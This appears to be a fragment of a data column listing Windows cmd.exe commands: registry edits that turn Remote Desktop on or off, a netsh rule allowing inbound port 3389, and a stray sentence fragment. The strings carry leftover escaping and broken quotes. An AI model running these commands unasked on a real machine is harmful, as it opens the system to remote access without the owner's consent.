column1: cmd.exe /c REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\'");
cmd.exe /c REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\'");
cmd.exe /c netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow\'");
cmd.exe and run it from there.
